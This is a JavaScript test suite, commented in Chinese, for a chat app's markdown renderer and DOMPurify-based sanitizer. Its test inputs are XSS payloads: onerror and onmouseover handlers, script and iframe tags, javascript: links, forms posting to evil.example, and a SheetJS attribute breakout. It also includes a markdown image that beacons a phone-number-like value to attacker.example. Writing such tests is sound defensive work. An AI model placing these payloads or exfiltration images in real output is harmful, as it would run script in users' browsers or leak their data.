import assert from 'node:assert/strict'
import test from 'node:test'
import { JSDOM } from 'jsdom'

import {
  createMarkdownRenderer,
  renderMarkdown,
  setupMarkedExtensions,
} from '../shared/markdown/index.js'
import { linkKnowledgeCitations } from '../shared/markdown/citations.js'
import {
  CODE_COPY_ONCLICK,
  isSafeLinkUrl,
  neutralizeUnsafeLinks,
  sanitizeHtml,
} from '../shared/markdown/sanitize.js'

// DOMPurify 需要 DOM：sanitize.js 在调用时读取 window，这里给它一个 jsdom 的 window
const dom = new JSDOM('')
globalThis.window = dom.window

setupMarkedExtensions()
const renderer = createMarkdownRenderer({ highlight: (code) => `<pre class="hljs"><code>${code}</code></pre>` })
const render = (md) => renderMarkdown(md, renderer).trim()
// 对话正文默认把模型写的原始 HTML 当文本显示；涉及 DOMPurify 的用例显式放行原始 HTML，
// 验证「万一放行也能挡住」这层兜底（文件预览走的就是这条路）。
const renderAllow = (md, options = {}) =>
  renderMarkdown(md, renderer, { rawHtml: 'allow', ...options }).trim()

test('模型输出里的原始 HTML 不能执行脚本', () => {
  const html = renderAllow(
    '结论 <img src=x onerror="alert(1)"> <script>alert(2)</script> <iframe src="https://evil.example"></iframe> ' +
      '<svg><script>alert(3)</script></svg> <a href="https://e.example" onmouseover="alert(4)">悬停</a>'
  )
  assert.ok(html.includes('<img src="x">'), html)
  for (const bad of ['onerror', '<script', 'alert(2)', '<iframe', 'onmouseover']) {
    assert.ok(!html.includes(bad), `${bad} 应被清掉：${html}`)
  }
})

test('javascript: / data: 链接去掉 href，文字保留', () => {
  assert.equal(renderAllow('[点我](javascript:alert(1))'), '<p><a>点我</a></p>')
  assert.equal(renderAllow('<a href="data:text/html,<script>alert(1)</script>">看</a>'), '<p><a>看</a></p>')
  assert.equal(renderAllow('<a href=" JaVaScRiPt:alert(1)">大小写</a>'), '<p><a>大小写</a></p>')
})

test('<style> 与 <form> 被去掉：不能改整页样式、不能把输入提交出去', () => {
  const html = renderAllow('前<style>body{display:none}</style>后\n\n<form action="https://evil.example"><input name="pwd"></form>')
  assert.ok(!html.includes('<style') && !html.includes('display:none'), html)
  assert.ok(!html.includes('<form') && !html.includes('evil.example'), html)
})

test('任何 target 都改成新标签页并断开 opener', () => {
  assert.equal(
    renderAllow('<a href="https://e.example" target="_top">x</a>'),
    '<p><a href="https://e.example" target="_blank" rel="noopener noreferrer">x</a></p>'
  )
})

test('渲染器自己的结构完整保留：外链、来源卡片、知识依据锚点、emoji', () => {
  const NEW_TAB = 'target="_blank" rel="noopener noreferrer"'
  assert.equal(
    render('见[文档](https://example.com/doc)说明'),
    `<p>见<a href="https://example.com/doc" ${NEW_TAB}>文档</a>说明</p>`
  )
  const card = render('东方财富收评 https://finance.eastmoney.com/a/1.html')
  assert.ok(card.includes(`<a class="msg-source-card" href="https://finance.eastmoney.com/a/1.html" ${NEW_TAB}`), card)
  assert.ok(card.includes('<svg') && card.includes('<span class="msg-source-card-title">东方财富收评</span>'), card)
  assert.equal(
    render(linkKnowledgeCitations('依据 [知识依据2] 如上', { 2: 1 })),
    '<p>依据 <a class="ke-cite" data-cite="1">[知识依据1]</a> 如上</p>'
  )
  assert.equal(
    render('好的 :rocket:'),
    '<p>好的 <span class="github-emoji" role="img" aria-label=":rocket:">🚀</span></p>'
  )
})

test('代码块复制按钮只放行渲染器写死的处理函数', () => {
  const html = render('```python\nprint(1)\n```')
  assert.ok(html.includes(`<button class="code-copy-btn" onclick="${CODE_COPY_ONCLICK}">`), html)
  // 伪造的按钮换了处理函数就照常剥掉
  const forged = renderAllow(`<button class="code-copy-btn" onclick="${CODE_COPY_ONCLICK};alert(1)">复制</button>`)
  assert.ok(!forged.includes('onclick'), forged)
  assert.ok(!renderAllow('<span class="code-copy-btn" onclick="copyCode(this)">x</span>').includes('onclick'))
})

test('KaTeX 公式保留样式与 MathML 结构，TeX 源码注解不漏进正文', () => {
  const html = render('行内 $x^2$ 结束')
  assert.ok(html.includes('<span class="katex">'), html)
  assert.ok(/style="height:[\d.]+em;?"/.test(html), html)
  assert.ok(html.includes('<msup><mi>x</mi><mn>2</mn></msup>'), html)
  assert.ok(!html.includes('annotation') && !html.includes('x^2'), html)
})

test('表格对齐、任务列表与 details 正常输出', () => {
  const html = render('| a | b |\n|:-|-:|\n| 1 | 2 |\n\n- [x] 完成\n\n<details><summary>展开</summary>内容</details>')
  assert.ok(html.includes('<th align="left">a</th>') && html.includes('<td align="right">2</td>'), html)
  assert.ok(html.includes('<input checked="" disabled="" type="checkbox"> 完成'), html)
  assert.ok(html.includes('<details><summary>展开</summary>内容</details>'), html)
})

test('SheetJS 兜底表格：单元格内容跳出 data-v 属性也注入不了标签', () => {
  // xlsx@0.18.5 的 sheet_to_html 对单元格 "><img src=x onerror=alert(1)> 的真实输出
  const sheetHtml =
    '<html><head><meta charset="utf-8"/><title>SheetJS Table Export</title></head><body><table><tr>' +
    '<td data-t="s" data-v=""><img src=x onerror=alert(1)>" id="sjs-A1">&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</td>' +
    '</tr></table></body></html>'
  const html = sanitizeHtml(sheetHtml)
  assert.ok(html.startsWith('<table>'), html)
  assert.ok(!/<img[^>]*onerror/.test(html), html)
})

test('没有 DOM 的环境原样返回（Node 脚本里没有注入点）', () => {
  globalThis.window = undefined
  try {
    assert.equal(sanitizeHtml('<b onclick="x()">a</b>'), '<b onclick="x()">a</b>')
  } finally {
    globalThis.window = dom.window
  }
  assert.equal(sanitizeHtml(''), '')
  assert.equal(sanitizeHtml(null), '')
})

test('isSafeLinkUrl：只认 http(s) / mailto / tel 与站内地址', () => {
  for (const ok of ['https://a.example/x', 'http://a.example', 'mailto:a@b.c', 'tel:123', '/agent/files', '#sec', 'doc.html', '']) {
    assert.equal(isSafeLinkUrl(ok), true, ok)
  }
  for (const bad of ['javascript:alert(1)', ' JAVASCRIPT:alert(1)', 'java\tscript:alert(1)', 'data:text/html,x', 'vbscript:x']) {
    assert.equal(isSafeLinkUrl(bad), false, bad)
  }
})

test('neutralizeUnsafeLinks：第三方渲染的 DOM 里去掉不安全的 href，文字保留', () => {
  const root = dom.window.document.createElement('div')
  root.innerHTML =
    '<a href="javascript:alert(1)">坏</a><a href="https://ok.example">好</a><a href="#toc">目录</a><a>无链接</a>'
  assert.equal(neutralizeUnsafeLinks(root), 1)
  assert.equal(root.innerHTML, '<a>坏</a><a href="https://ok.example">好</a><a href="#toc">目录</a><a>无链接</a>')
  assert.equal(neutralizeUnsafeLinks(null), 0)
})

test('非网页链接不在本页跳转：相对地址、锚点、脚注只留文字；网页链接新标签页打开', () => {
  assert.equal(
    render('报告：[季度报告](report.docx)，[明细](/workspace/detail.xlsx)，[第一章](#第一章)'),
    '<p>报告：<span class="md-link-disabled" title="report.docx">季度报告</span>，' +
      '<span class="md-link-disabled" title="/workspace/detail.xlsx">明细</span>，' +
      '<span class="md-link-disabled" title="#第一章">第一章</span></p>'
  )
  assert.equal(render('结论[^1]\n\n[^1]: 来源：年报'), '<p>结论<span class="md-link-disabled" title="来源：年报">^1</span></p>')
  // 模型直接写的 HTML 链接同样处理
  assert.equal(renderAllow('<a href="/workspace/x.docx">下载</a>'), '<p><a>下载</a></p>')
  assert.equal(
    renderAllow('<a href="//mirror.example/x">镜像</a>'),
    '<p><a href="//mirror.example/x" target="_blank" rel="noopener noreferrer">镜像</a></p>'
  )
  assert.equal(render('[发邮件](mailto:a@b.com)'), '<p><a href="mailto:a@b.com">发邮件</a></p>')
})

test('对话里的外站图片不自动加载，改成点开才请求的链接；音视频与 url() 样式去掉', () => {
  const html = render('![收益曲线](https://attacker.example/log?d=13800000000)')
  assert.ok(!html.includes('<img'), html)
  assert.ok(
    html.includes('<a class="md-image-link" href="https://attacker.example/log?d=13800000000" target="_blank" rel="noopener noreferrer"'),
    html
  )
  assert.ok(html.includes('>图片：收益曲线（attacker.example）</a>'), html)
  const raw = renderAllow('<img src="https://evil.example/x.png"> <img srcset="https://evil.example/2x.png 2x" src="/static/a.png">')
  assert.ok(!/<img[^>]*evil\.example/.test(raw) && !raw.includes('srcset'), raw)
  assert.ok(raw.includes('<img src="/static/a.png">'), raw)
  assert.ok(render('![点](data:image/png;base64,iVBORw0KGgo=)').includes('<img src="data:image/png;base64,iVBORw0KGgo="'))
  const media = renderAllow(
    '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>' +
      '<span style="background:url(https://evil.example/x)">样式</span>'
  )
  assert.ok(!media.includes('evil.example'), media)
})

test('文件预览（remoteImages: inline）外站图片照常显示', () => {
  const html = renderMarkdown('![图](https://img.example/a.png)', renderer, { sourceCards: false, remoteImages: 'inline' })
  assert.equal(html.trim(), '<p><img src="https://img.example/a.png" alt="图"></p>')
})
